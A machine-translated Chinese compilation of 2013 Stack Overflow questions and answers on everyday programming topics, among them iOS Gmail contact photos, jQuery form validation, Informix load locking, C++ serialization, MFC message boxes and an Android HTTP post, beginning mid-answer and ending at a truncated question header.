要使用 ${EXENAME} 添加此功能，以便为 VC 设置全局（解决方案范围）设置，可能会在此处显示：[Visual c++ 2008：如何在解决方案中定义全局设置](https://stackoverflow.com/q/377075/694576)或/和此处：[可以我通过命令行将预处理器定义传递给资源编译器？](https://stackoverflow.com/q/7149572/694576)

# ios - 如何从 gmail 联系人中获取朋友的个人资料图片？

> ID：15738482
> 
> 赞同：2
> 
> 时间：2013-04-01T06:07:46.733
> 
> 标签：ios

我正在尝试导入 GMail 联系人（朋友列表）。我有朋友的邮件 ID、姓名和电话号码，但如果我试图获取图像，它会显示“401 错误”。

我使用的代码如下：

```
GDataLink *photoLink = [contact photoLink];
NSLog(@"%@",photoLink);

NSURL *imageURL = [photoLink URL];
NSLog(@"image url = %@",imageURL); 
```

如何获取好友的头像？我哪里做错了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:23:29.683

[查看与您正在执行的操作大致相同的其他（公共）代码](https://github.com/nparry/gdata-objectivec-client/blob/master/Examples/ContactsSample/ContactsSampleWindowController.m)，我发现您应该使用带有这些照片链接的***身份验证令牌。***如果没有该身份验证令牌，Google 会假定您可能是恶意的，并会发回 401 错误。

例如

```
 GDataLink *photoLink = [contact photoLink];

    NSString *imageETag = [photoLink ETag];
    if (imageETag == nil || ![mContactImageETag isEqual:imageETag]) {

      if (imageETag != nil) {

        // get an NSURLRequest object with an auth token
        NSURL *imageURL = [photoLink URL];
        GDataServiceGoogleContact *service = [self contactService];

        // requestForURL:ETag:httpMethod: sets the user agent header of the
        // request and, when using ClientLogin, adds the authorization header
        NSMutableURLRequest *request = [service requestForURL:imageURL
                                                         ETag:nil
                                                   httpMethod:nil];

        [request setValue:@"image/*" forHTTPHeaderField:@"Accept"];

        GTMHTTPFetcher *fetcher = [GTMHTTPFetcher fetcherWithRequest:request];
        [fetcher setAuthorizer:[service authorizer]];
        [fetcher beginFetchWithDelegate:self
                 didFinishSelector:@selector(imageFetcher:finishedWithData:error:)];
      }
    }
  } 
```

# barcode - 二维数据矩阵（条形码）检测算法没有给我结果

> ID：15738483
> 
> 赞同：0
> 
> 时间：2013-04-01T06:07:50.870
> 
> 标签：barcode

我正在检测二维数据矩阵，但检测存在问题，因为条形码在每个产品中都会改变其设计，那么如何检测它？有谁能够帮助我 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T06:45:38.113

数据矩阵的规范被设计为可识别的。您需要按照预期的方式查看代码。我要开始的地方是代码有一个安静区域和一个“L”模式。这就是你要找的。

您如何进行此操作在很大程度上取决于图像的一般参数。

首先要考虑的是照明和对比度。你能依靠有一个固定的中点，把所有颜色较浅的东西称为白色，把所有颜色较深的东西称为黑色吗？或者一个简单的直方图会给出一个可用的中点吗？或者阴影和不均匀的照明是否会导致图像阳光侧的值被称为黑色，而图像阴影侧的相同色调为白色？在平板扫描仪上，依靠良好的对比度很容易，但手机照片的问题更大。

下一个考虑因素是尺寸和分辨率。对于照相手机应用程序，预计在低分辨率图像中，大部分图像将包含条形码，而扫描仪可能有大量图像和少量条形码数据需要搜索。

最后是演示。条形码会出现 360 度旋转吗？它是平坦的还是水平的，还是可以倾斜、卷曲和成角度的？是否担心镜头失真？

一旦您可以回答这些注意事项，它应该指出您需要做什么来识别条形码。Datamatrix 有时钟标记，可以读取失真代码，但定义失真需要做更多的工作，所以如果不需要，你就不会这样做。

# php - 每行的多行 php 验证

> ID：15738484
> 
> 赞同：0
> 
> 时间：2013-04-01T06:07:54.663
> 
> 标签：php, jquery

![图片](https://i.stack.imgur.com/stFhN.jpg)

请参考上图。我对jquery很陌生，我开发了一个php表单来输入数据。如果他/她输入错误的值，我想限制用户离开文本字段。范围：比如 0 到 50。它也应该接受 AB、NR。

任何想法如何实现这一点。

我非常感谢您的快速回复。

我换了

```
<script>
$.validator.addMethod("custom_number", function(value, element) {
return this.optional(element) || value == "AB" || value == "NF" || 
value.match(/^[0-9,\+-]+$/);
}, "Please enter a valid number, or 'AB'");

$(document).ready(function(){
$("#form").validate({
rules: {
'hd[]': {
required: false,
custom_number: true   
}
}
});
});
</script> 
```

和

```
<script>
var accept_values = array("AB","NR",'01','02','03','04','05','06','07','08','09','10');

function inArray(needle, haystack) {
var length = haystack.length;
for(var i = 0; i < length; i++) {
if(haystack[i] == needle) return true;
}
return false;
}

var success = 0;
$("input[type='hd[]']").each(function(){
if(!in_array(accept_values, $(this).val())) {
success = 1;
}
});
if(success == 1){
alert("You have entered an invalid value");
return false;

}
//do success
</script> 
```

希望我能接受 01 到 10 和 'AB' 和 'NR' 但它没有成功。有没有办法提供范围和字母？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:28:41.230

请根据您的要求/需要进行修改：

```
function validate(){
    $('.theory').each(function(){           
            if($(this).val() == ''){
                alert('Please enter value.');       
                return false;
            }else{
                if($(this).val() < 0  || $(this).val() > 50  ){
                            alert('Please enter correct value.');               
                            return false;
                     }
            }       
    });

  return true;

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:27:28.843

希望您的文本框具有相同的 css 类（例如：checkrow）。

**Jquery 代码（未经测试）**

```
 $(function(){
    var status =true;
    $('.checkrow').on('blur',function(){
    var valueofrow =$(this).val();
    if(valueofrow =='AB' || valueofrow =='NR'){
    status =true;
    } else{
    status =false;
    }
    if(status == false){
    alert("warning message");
    return false;
    } 
    });
    }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:22:51.640

```
var accept_values = array("AB","NR");

function inArray(needle, haystack) {
    var length = haystack.length;
    for(var i = 0; i < length; i++) {
        if(haystack[i] == needle) return true;
    }
    return false;
}

var success = 0;
$("input[type='text']").each(function(){
    if(!in_array(accept_values, $(this).val())) {
        success = 1;
    }
});
if(success == 1){
    alert("You have entered an invalid value");
    return false;
}
//do success 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T07:18:59.917

我尝试使用 jquery 验证器解决您的问题。

检查它是否符合您的要求，或者您想要改变一些东西..

```
 <script src='
        http://code.jquery.com/jquery-latest.min.js '></script>
        <script src='http://ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/jquery.validate.min.js'></script>
        <script>
        $(document).ready(function(){

        $('#frm').validate();

        $(".inp_text").each(function(){
        $(this).rules("add", {
        required: true,
        checkValue: true
         });   
       });

            $.validator.addMethod("checkValue", function(value, element) {
            var response = ((value > 0)&&(value <= 50))||((value == 'AB')||(value =='NR'));
           return response;
           }, "invalid value");

        })

        </script>

        <form id='frm'>
        <input type='text' name='inp_text'   class='inp_text'/><br>
        <input type='text' name='inp_text1' class='inp_text'/><br>
        <input type='submit' name=''/>
        </frm> 
```

请注意，所有输入都应具有相同的类

# locking - 在 informix 中加载操作锁定表

> ID：15738490
> 
> 赞同：1
> 
> 时间：2013-04-01T06:08:29.420
> 
> 标签：locking, informix

一个进程正在对`LOAD`具有超过 50 万行的文件中的表执行操作。
`onstat -k`命令显示插入行的行锁，我认为这是正常的。
我看到的一些异常情况是`onstat -u`显示对该会话的巨大锁定的结果。

访问此表的其他进程也正在获取`SQLERR` `-245`

我的问题是为什么巨大的插入操作应该锁定表？它不应该只锁定行吗？表的默认锁定模式是`row`

Informix 版本是`IDS 11.5`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T17:49:10.870

您是否使用 DB-Access 来执行 LOAD？还有许多其他工具可以执行 LOAD，并且每个工具都有自己的实现——它实际上不是内置于 DBMS 本身的操作（我不会详细说明为什么会这样）。

您是否考虑过使用 DB-Load 代替？它的优点之一是它可以将大负载分解为可管理的事务——例如，它可以每加载 1000 行就提交一次。这极大地减少了锁定系统的压力。

您可能还想考虑 EXTERNAL TABLE 是否会提高加载性能。

# c++ - 序列化浮点向量

> ID：15738494
> 
> 赞同：3
> 
> 时间：2013-04-01T06:08:49.130
> 
> 标签：c++, boost, xcode4, stdvector

问题是我想在文件中保存一个二维浮点向量。由于我不熟悉变得麻烦的 C++，因此可能的解决方法是：

1.  将它们序列化为字符串并写入文件。
2.  将它们序列化为二进制数据并写入文件。

这两种方法中的哪一种在速度方面可能更有效？

我正在做类似的事情：

```
std::string serialized;

    for (int s = 0; s < (int) mfcc_features_a.size(); s++)
     {

     for (int t = 0; t < (int) mfcc_features_a[s].size(); t++){
       serialized = serialized + "|" + boost::lexical_cast<std::string>(mfcc_features_a[s][t]);
     }
     }

    std::cout << "serialized string is: " << serialized << std::endl; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T06:12:02.317

存储二进制数据可能会更快一些，因为数据几乎肯定会更小。差异可能对程序的整体性能很重要，也可能不重要：您必须进行测量才能找出答案。

在 C++03 中，您的代码效率非常低下。`specialized = specialized + "|" + ...`逐渐创建越来越长的完整数据副本，每个浮点值三个副本。要么使用`+=`，要么将数据直接写入流。在 C++11 中，您可以通过编写来解决它`specialized = std::move(specialized) + "|" + ...`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:13:51.613

虽然二进制肯定会更快地执行，但编码和调试可能很麻烦，因为大多数程序员对浮点格式了解甚少。在这方面，整个时间编程加上执行可能会更慢。

此外，如果需要将数据移植到任何其他机器上，几乎可以肯定将其转换为通用可读格式是值得的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T07:34:00.387

虽然不是很 C++'ish，但我喜欢使用`sprintf`例程将浮点值格式化为固定宽度的字符串（24 个字符）。

```
char *pData = new char[vec.size() * 24 + 1];
char *p = pData;
for (size_t i = 0; i < vec.size(); ++i, p += 24)
    sprintf(p, "%+.14E\r\n", vec(i));

// ... write pData to file ...

delete[] pData; 
```

祝你好运！

# javascript - 从日期选择器中保存选定的日期，甚至页面刷新

> ID：15738495
> 
> 赞同：0
> 
> 时间：2013-04-01T06:09:12.957
> 
> 标签：javascript, html

我有一个问题，关于即使在我的页面重新加载后，如何从日期选择器中保存选定日期的 cookie？我有一个页面需要从日期选择器中选择 3 个不同的日期，一旦选择了日期，我希望文本框将日期保存到 cookie 中，直到我下一次更改。那有可能做到吗？

期待一些指导。

谢谢。

```
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <script type='text/javascript' href="/jquery-1.5.2.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
    <link rel="stylesheet" type="text/css" href="/css/result-light.css">
    <title>Blueprint</title>
    <style type='text/css'>
        #gradient {
            color: #000000;
            height: 100px;
            padding: 10px;
            /* For WebKit (Safari, Google Chrome etc) */
            background: -webkit-gradient(linear, left top, left bottom, from(#FFD700), to(#fff));
            /* For Mozilla/Gecko (Firefox etc) */
            background: -moz-linear-gradient(top, #FFD700, #fff);
            /* For Internet Explorer 5.5 - 7 */
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#FFD700, endColorstr=#FFFFFFFF);
            /* For Internet Explorer 8 */
            -ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr=#FFD700, endColorstr=#FFFFFFFF)";
        }
    </style>

    <script type='text/javascript'>
        //call for Blueprint
        $(function () {
            $('.datepower').each(function () {
                var disabledDays = [""];

                /* utility functions */
                function nationalDays(date) {
                    var m = date.getMonth(),
                            d = date.getDate(),
                            y = date.getFullYear();
                    //console.log('Checking (raw): ' + m + '-' + d + '-' + y);
                    for (i = 0; i < disabledDays.length; i++) {
                        if ($.inArray((m + 1) + '-' + d + '-' + y, disabledDays) != -1 || new Date() > date) {
                            return [true];
                        }
                    }
                    return [true];
                }

                //Block the Weekends
                function noWeekendsOrHolidays(date) {
                    var noWeekend = $.datepicker.noWeekends(date);
                    if (noWeekend[0]) {
                        return nationalDays(date);
                    } else {
                        return noWeekend;
                    }
                }

                function days() {
                    var a = $("#datepicker_start").datepicker('getDate');
                    var b = new Date();
                    var c = 24 * 60 * 60 * 1000;
                    var diffDays = Math.round(Math.abs((a - b) / (c)));

                    $("#totaldays").val(diffDays)
                }

                $(document).ready(function () {
                    $.datepicker.setDefaults({
                        dateFormat: 'dd/mm/yy',
                        selectOtherMonths: true,
                        changeMonth: true,
                        changeYear: true,
                        numberOfMonths: 1,
                        constrainInput: true,
                        beforeShowDay: nationalDays,
                    });
                    var selector = function (dateStr) {
                        var d1 = $('#datepicker_start').datepicker('getDate');
                        var d2 = $('#datepicker_end').datepicker('getDate');
                        var diff = 0;
                        if (d1 && d2) {
                            diff = Math.floor((d2.getTime() - d1.getTime()) / 86400000); // ms per day
                        }
                        $('#totaldays').val(diff);
                    }
                    $('#datepicker_start').datepicker({
                        maxDate: 0,
                        onSelect: function (selectedDate) {
                            var minDate = $(this).datepicker('getDate');
                            if (minDate) {
                                minDate.setDate(minDate.getDate() + 3);
                            } //min days requires
                            $('#datepicker_end').datepicker('option', 'minDate', selectedDate); // Date + 1 or tomorrow by default
                            days();
                        }
                    });
                    $('#datepicker_end').datepicker({
                        minDate: 1,
                        onSelect: function (selectedDate) {
                            var maxDate = $(this).datepicker('getDate');
                            if (maxDate) {
                                maxDate.setDate(maxDate.getDate() - 1);
                            }
                            $('#datepicker_start').datepicker('option', 'maxDate', selectedDate); // Date - 1    
                            days();
                        }
                    });

                    $('#datepicker_start,#datepicker_end').change(selector)
                });
            });
        });

        //call for Business One
        $(function () {
            $('.datepower2').each(function () {
                var disabledDays = [""];

                /* utility functions */
                function nationalDays2(date) {
                    var m = date.getMonth(),
                            d = date.getDate(),
                            y = date.getFullYear();
                    //console.log('Checking (raw): ' + m + '-' + d + '-' + y);
                    for (i = 0; i < disabledDays.length; i++) {
                        if ($.inArray((m + 1) + '-' + d + '-' + y, disabledDays) != -1 || new Date() > date) {
                            return [true];
                        }
                    }
                    return [true];
                }

                //Block the Weekends
                function noWeekendsOrHolidays2(date) {
                    var noWeekend = $.datepicker.noWeekends(date);
                    if (noWeekend[0]) {
                        return nationalDays2(date);
                    } else {
                        return noWeekend;
                    }
                }

                function days2() {
                    var a = $("#datepicker_start2").datepicker('getDate');
                    var b = new Date();
                    var c = 24 * 60 * 60 * 1000;
                    var diffDays = Math.round(Math.abs((a - b) / (c)));

                    $("#totaldays2").val(diffDays)
                }

                $(document).ready(function () {
                    $.datepicker.setDefaults({
                        dateFormat: 'dd/mm/yy',
                        selectOtherMonths: true,
                        changeMonth: true,
                        changeYear: true,
                        numberOfMonths: 1,
                        constrainInput: true,
                        beforeShowDay: nationalDays2,
                    });
                    var selector = function (dateStr) {
                        var d1 = $('#datepicker_start2').datepicker('getDate');
                        var d2 = $('#datepicker_end2').datepicker('getDate');
                        var diff = 0;
                        if (d1 && d2) {
                            diff = Math.floor((d2.getTime() - d1.getTime()) / 86400000); // ms per day
                        }
                        $('#totaldays2').val(diff);
                    }
                    $('#datepicker_start2').datepicker({
                        maxDate: 0,
                        onSelect: function (selectedDate) {
                            var minDate = $(this).datepicker('getDate');
                            if (minDate) {
                                minDate.setDate(minDate.getDate() + 3);
                            } //min days requires
                            $('#datepicker_end2').datepicker('option', 'minDate', selectedDate); // Date + 1 or tomorrow by default
                            days2();
                        }
                    });
                    $('#datepicker_end2').datepicker({
                        minDate: 1,
                        onSelect: function (selectedDate) {
                            var maxDate = $(this).datepicker('getDate');
                            if (maxDate) {
                                maxDate.setDate(maxDate.getDate() - 1);
                            }
                            $('#datepicker_start2').datepicker('option', 'maxDate', selectedDate); // Date - 1    
                            days2();
                        }
                    });

                    $('#datepicker_start2,#datepicker_end2').change(selector)
                });
            });
        });

        //call for Sigma
        $(function () {
            $('.datepower3').each(function () {
                var disabledDays = [""];

                /* utility functions */
                function nationalDays3(date) {
                    var m = date.getMonth(),
                            d = date.getDate(),
                            y = date.getFullYear();
                    //console.log('Checking (raw): ' + m + '-' + d + '-' + y);
                    for (i = 0; i < disabledDays.length; i++) {
                        if ($.inArray((m + 1) + '-' + d + '-' + y, disabledDays) != -1 || new Date() > date) {
                            return [true];
                        }
                    }
                    return [true];
                }

                //Block the Weekends
                function noWeekendsOrHolidays3(date) {
                    var noWeekend = $.datepicker.noWeekends(date);
                    if (noWeekend[0]) {
                        return nationalDays3(date);
                    } else {
                        return noWeekend;
                    }
                }

                function days3() {
                    var a = $("#datepicker_start3").datepicker('getDate');
                    var b = new Date();
                    var c = 24 * 60 * 60 * 1000;
                    var diffDays = Math.round(Math.abs((a - b) / (c)));

                    $("#totaldays3").val(diffDays)
                }

                $(document).ready(function () {
                    $.datepicker.setDefaults({
                        dateFormat: 'dd/mm/yy',
                        selectOtherMonths: true,
                        changeMonth: true,
                        changeYear: true,
                        numberOfMonths: 1,
                        constrainInput: true,
                        beforeShowDay: nationalDays3,
                    });
                    var selector = function (dateStr) {
                        var d1 = $('#datepicker_start3').datepicker('getDate');
                        var d2 = $('#datepicker_end3').datepicker('getDate');
                        var diff = 0;
                        if (d1 && d2) {
                            diff = Math.floor((d2.getTime() - d1.getTime()) / 86400000); // ms per day
                        }
                        $('#totaldays3').val(diff);
                    }
                    $('#datepicker_start3').datepicker({
                        maxDate: 0,
                        onSelect: function (selectedDate) {
                            var minDate = $(this).datepicker('getDate');
                            if (minDate) {
                                minDate.setDate(minDate.getDate() + 3);
                            } //min days requires
                            $('#datepicker_end3').datepicker('option', 'minDate', selectedDate); // Date + 1 or tomorrow by default
                            days3();
                        }
                    });
                    $('#datepicker_end3').datepicker({
                        minDate: 1,
                        onSelect: function (selectedDate) {
                            var maxDate = $(this).datepicker('getDate');
                            if (maxDate) {
                                maxDate.setDate(maxDate.getDate() - 1);
                            }
                            $('#datepicker_start3').datepicker('option', 'maxDate', selectedDate); // Date - 1    
                            days3();
                        }
                    });
                    $('#datepicker_start3,#datepicker_end3').change(selector)
                });
            });
        });
    </script>
</head>
<body>
    <link rel="stylesheet" href="/jquery-ui.css"/>
    <script href="/jquery-1.8.3.js"></script>
    <script href="/jquery-ui.js"></script>
    <table id="gradient" align="center" width="400">
        <tr>
            <td colspan=1 align=left style="font-family:tahoma;font-size:26px;"><b>Blueprint</b>

                <p style="font-family:tahoma;font-size:16px;">Last Situation Date:
                    <input style="width:80px;background-color:transparent;" type="text" class="datepower"
                           id="datepicker_start" name="frome" value=""></p></td>
            <td style="text-align: right">
                <label for="days"></label>
                <input type="text" readonly="readonly" class="datepower" name="totaldays" id="totaldays"
                       style="width:80px;font-size:48px;font-weight:bold;background-color:transparent;border:none;text-align:right;"
                       onChange="this.form.submit()" value=""><b> Days</b></td>
        </tr>
    </table>
    <table id="gradient" align="center" width="400">
        <tr>
            <td colspan=1 align=left style="font-family:tahoma;font-size:26px;"><b>Business One</b>

                <p style="font-family:tahoma;font-size:16px;">Last Situation Date:
                    <input style="width:80px;background-color:transparent;" type="text" class="datepower2"
                           id="datepicker_start2" name="frome2" value=""></p></td>
            <td style="text-align: right">
                <label for="days2"></label>
                <input type="text" readonly="readonly" class="datepower2" name="totaldays2" id="totaldays2"
                       style="width:80px;font-size:48px;font-weight:bold;background-color:transparent;border:none;text-align:right;"
                       onChange="this.form.submit()" value=""><b> Days</b></td>
        </tr>
    </table>
    <table id="gradient" align="center" width="400">
        <tr>
            <td colspan=1 align=left style="font-family:tahoma;font-size:26px;"><b>Sigma</b>

                <p style="font-family:tahoma;font-size:16px;">Last Situation Date:
                    <input style="width:80px;background-color:transparent;" type="text" class="datepower3"
                           id="datepicker_start3" name="frome3" value=""></p></td>
            <td style="text-align: right">
                <label for="days3"></label>
                <input type="text" readonly="readonly" class="datepower3" name="totaldays3" id="totaldays3"
                       style="width:80px;font-size:48px;font-weight:bold;background-color:transparent;border:none;text-align:right;"
                       onChange="this.form.submit()" value=""><b> Days</b></td>
        </tr>
    </table>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-04T03:07:15.730

您应该能够使用 jquery cookie 插件做您需要的事情：

[https://github.com/carhartl/jquery-cookie](https://github.com/carhartl/jquery-cookie)

它允许您保存 cookie 选项：

```
$.cookie("test", 1); 
```

阅读 cookie 选项：

```
var cookieValue = $.cookie("test"); 
```

并删除一个 cookie 选项：

```
$.removeCookie("test"); 
```

另请参阅此答案：[如何使用 jQuery 设置/取消设置 cookie？](https://stackoverflow.com/questions/1458724/how-to-set-unset-cookie-with-jquery)

# c++ - MFC C++ 如何在 MessageBox 中显示 const char 值？

> ID：15738503
> 
> 赞同：5
> 
> 时间：2013-04-01T06:10:02.817
> 
> 标签：c++, mfc, char, cstring

我希望标题足以帮助解释需要什么。在解决了这个问题后，我的大部分项目都应该完成。

当我这样做时

```
 char e[1000] = "HELLO";
    CString msg;
    msg.Format(_T("%s"), e);
    MessageBox(msg); 
```

消息框只显示像“㹙癞鞮㹙癞鞮”这样的随机词，而不是我想要的“HELLO”。我该如何解决这个问题？

帮助将不胜感激。谢谢你

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T06:25:21.403

首先，您是否真的以这种方式使用 MessageBox API。检查[MSDN 文档](http://msdn.microsoft.com/en-us/library/windows/desktop/ms645505%28v=vs.85%29.aspx)。现在回答你的问题，

```
char e[1000] = "HELLO";
CString msg;
msg.Format(_T("%S"), e); // Mind the caps "S"
MessageBox( NULL, msg, _T("Hi"), NULL ); 
```

我想，你甚至不需要`Format`这里的数据。您可以使用：：

```
TCHAR e[1000] = _T("HELLO") ;
MessageBox( NULL, e, _T("Hi"), NULL ) ; 
```

这样，如果`_UNICODE is defined`，两者都`TCHAR and MessageBox`将被选为`WCHAR and MessageBoxW`和 if `not defined`as `char and MessageBoxA`。

# javascript - jQuery .on() 不适用于动态 Raphael 元素

> ID：15738513
> 
> 赞同：1
> 
> 时间：2013-04-01T06:11:10.377
> 
> 标签：javascript, jquery, raphael

在下面的 JS Fiddle 中，我添加了一个 Raphael 画布。当您按住 ctrl 单击画布上的任意位置时，它会在左上角创建一个带有“c”类的圆圈。单击圆圈时，.on() 事件应该触发警报（'hi'）。但是， .on('click', '.c') 事件不起作用。有人可以解释为什么没有触发动态点击事件吗？

```
var r;
$(document).ready(function (){

r = Raphael('d1', 100, 100);   

});
$(document).on('click', '#d1', function (e){ 

e.preventDefault();
e.stopPropagation();
if (e.ctrlKey)
    {  
       var posX = $(this).offset().left, posY = $(this).offset().top;
       var shape = r.circle(20, 20, 20, 20);
       shape.node.setAttribute('class', 'c');
       shape.attr({fill: '#fff', stroke: '#fff', "fill-opacity": 100, "stroke-width": 2});
    }

});
$(document).on('click', '.c', function (e){ 

e.preventDefault();
e.stopPropagation();

alert('hi');

}); 
```

[http://jsfiddle.net/TyVtW/](http://jsfiddle.net/TyVtW/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T06:18:06.113

您可以按如下方式进行。

```
$(document).on('click', '#d1 circle[class="c"]', function (e){ 
```

### [`jsFiddle DEMO`](http://jsfiddle.net/TyVtW/6/)

# c++ - 为什么在这里允许访问私有变量？

> ID：15738516
> 
> 赞同：2
> 
> 时间：2013-04-01T06:11:43.073
> 
> 标签：c++

我已经声明了这个类。我观察到在方法 distance(Point b) 中，如何访问 Point - bx 和 by 的私有成员？如果我尝试访问 bx 并在 main 中访问，则不允许。

```
#include <iostream>
#include <cmath>

using namespace std;

class Point {
private:
    int x, y;
public:
    Point() {
        cout << "Constructor called" << endl;
        x = 0; y = 0;
    }

    ~Point() {
    }

    void set(int a, int b) {
        x = a;
        y = b;
    }

    void offset(int dx, int dy) {
        x += dx;
        y += dy;
    }

    void print() {
        cout << "(" << x << "," << y << ")" << endl;
    }

    // HERE
    double distance(Point b) {
        return (sqrt(pow(x-b.x, 2)+pow(y-b.y, 2)));
    }
};

int main() {
Point p, q;

p.print();
p.offset(4, 3);
p.print();

q.set(10, 2);

cout << "Distance: " << p.distance(q) << endl;

return 0;
} 
```

注意：我已经在 ideone.com 上编译并运行了该程序

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T06:18:26.813

诸如 等访问说明符的概念`private`适用`public`于`classes`，而不仅仅是类的对象。如果一个变量`private`在一个类中，并且该类的一个对象 A 具有一个函数，该函数接受同一类的另一个对象 B，则 A 可以访问 B 的私有成员，因为 A 和 B 属于同一类。

复制构造函数依赖于此：

```
#include <iostream>                                                                

using namespace std;                                                            

class A {                                                                       
  public:                                                                       

     A(){val = 1.0;}                                                            

     //copy constructor                                
     A(const A& _other) {                                                       
       val = _other.val; //accessing private member of _other                   
     }                                                                          

    double dist(A _a) {return val - _a.val;} //accessing private member of _other

  private:                                                                      
    double val;                                                                 
};                                                                              

int main() {                                                                    

A a;                                                                            
A b;                                                                            

cout << a.dist(b) << endl;                                                      

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:31:51.663

`int x, y;`对 Class Point是**私有的**。这意味着Class Point的所有成员都可以访问，修改它。

**Class Point**的函数和构造函数是公共的，即其他函数（来自其他类等）[如 main] 可以访问它们。OOPS 的想法是确保您的数据安全，任何想要修改值的人都可以通过该类的公共方法来完成。他们无法直接访问它们。这使您可以检查对数据的无效修改[设置无效值`height = -4;`等]

如果你保持[`int x,y`这`public`不是正确的OOPs]，任何函数（主要等）都可以访问它并将值修改为不受欢迎的值。

`Point p;`

`p.x = -5`（假设您只想要 x 的 +ve 值，您无法检查访问的函数是否设置了一些不需要的值）`

不是一个相关的类比，但仍然......你在房子里有一个只有家庭成员才能进入的房间。任何外人想要保留或移除或对房子里的东西做任何事情，都必须请你的家人去做。如果你假设即使是家庭成员也不允许进入房间[假设即使成员函数也不能访问变量]，那么在房间里保留任何东西都没有用[任何人都不能使用数据]

# c# - C#中的高速缓存模拟

> ID：15738517
> 
> 赞同：2
> 
> 时间：2013-04-01T06:11:46.843
> 
> 标签：c#, html, caching, memory, html-table

我正在用 C# 模拟高速缓存。用户输入块大小、缓存大小和用于在缓存中放置块的二进制数。

块放置后生成的缓存行将显示在 html 表中，并且还应显示整个缓存的块排列。我不知道如何根据选定的块大小显示这些缓存行和缓存排列。有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T16:13:18.693

好吧，按照我在评论中提到的内容，也许碎片整理类型的 UI 可能适合您的需求，这是一个快速而肮脏的示例，说明如何在 html 和 CSS 中执行此操作：

```
<html>
    <head>
        <style>
            .block { width:20px; height:20px; float:left; border:1px; border-color: black;  border-style:solid; }
            .used { background-color: green }
            .expired { background-color: red }
            .free { background-color: grey }
        </style>
    </head>
    <body>
        <script language="javascript">
            var types = ['used', 'expired', 'free'];
            var i = 0;
            while (i < 256) {
                var type = Math.floor(Math.random() * 3); //rnd between 0-2
                var size = Math.floor(Math.random() * 20) + 1; //rnd  1-20
                while(size > 0 && i < 256) {
                    document.write('<div class="block ' + types[type] + '"></div>');
                    size = size - 1;
                    i = i + 1;
                }
            }
        </script>
    </body>
</html> 
```

这里我只是随机生成 256 个块，一次随机使用或释放​​最多 20 个块。`<div>`最终，这只是用特定类生成 a 的问题，仅此而已。

它看起来像这样： ![在此处输入图像描述](https://i.stack.imgur.com/3p4Wf.png)

# magento - 固定类型捆绑产品的贷项通知单的退回库存复选框不可用

> ID：15738518
> 
> 赞同：3
> 
> 时间：2013-04-01T06:11:55.817
> 
> 标签：magento, magento-1.7

以下是我对这个问题的 Magento 设置

配置系统 > 配置 > 目录选项卡 > 库存 > 自动将贷项凭证项目退回到库存 = YES

捆绑产品 001 = SKU、重量和价格设置为动态，包含两个捆绑项目 002 = SKU、重量和价格设置为固定，包含两个捆绑项目

在我将订单和发票与上述捆绑产品放在一起之后。假设在此处输入代码 ORDER1 有产品 001 ORDER2 有产品 002

Return to Stock 复选框仅对 ORDER2 可用/可见。不适用于 ORDER1

谁能帮我说说这是为什么？

# android - HTTP post在json Android2.2版本中没有得到响应？

> ID：15738520
> 
> 赞同：0
> 
> 时间：2013-04-01T06:12:10.897
> 
> 标签：android

嗨，我没有得到响应`Android 2.2`版本，但工作正常`4.0 version`。

我的代码如下：

```
HttpPost method = new HttpPost(url);
        UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(nameValuePairs);
        System.out.println("**************Request=>"+urlEncodedFormEntity.toString());
        method.setEntity(urlEncodedFormEntity);
        HttpResponse response = executeMethod(method);

        HttpEntity entity = response.getEntity();
        if(entity!=null) {
            String value = EntityUtils.toString(entity);
            Log.i("", "Meesage"+value);

        }
        String responseStr = EntityUtils.toString(response.getEntity()) 
```

在运行 2.2 版本时，我收到了这种类型的 Log cat 消息

```
04-01 11:41:12.101: W/KeyCharacterMap(13719): Can't open keycharmap file
04-01 11:41:12.101: W/KeyCharacterMap(13719): Error loading keycharmap file '/system/usr/keychars/sec_touchscreen_.kcm.bin'. hw.keyboards.65538.devname='sec_touchscreen '
04-01 11:41:12.101: W/KeyCharacterMap(13719): Using default keymap: /system/usr/keychars/qwerty.kcm.bin 
```

请给我解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:37:10.180

像这样试试。

```
try {

        HttpClient client = new DefaultHttpClient();
        HttpConnectionParams.setConnectionTimeout(client.getParams(), 20000);
        HttpConnectionParams.setSoTimeout(client.getParams(), 2000);

        HttpResponse response;
        HttpPost post = new HttpPost("Your url");

        response = client.execute(post);

        InputStream in = response.getEntity().getContent();
        String a = convertStreamToString(in);
        //Log.v("Response", ""+a);

            } catch (Exception e) {
          e.printStackTrace();
        }

//Json response
private String convertStreamToString(InputStream is) {
            // TODO Auto-generated method stub
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();

            String line = null;

              try {
                    while ((line = reader.readLine()) != null) {

                        sb.append(line + "\n");
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    try {
                        is.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                return sb.toString();
    } 
```

# sql-server-2008 - 如何通过文本框插入时间

> ID：15738530
> 
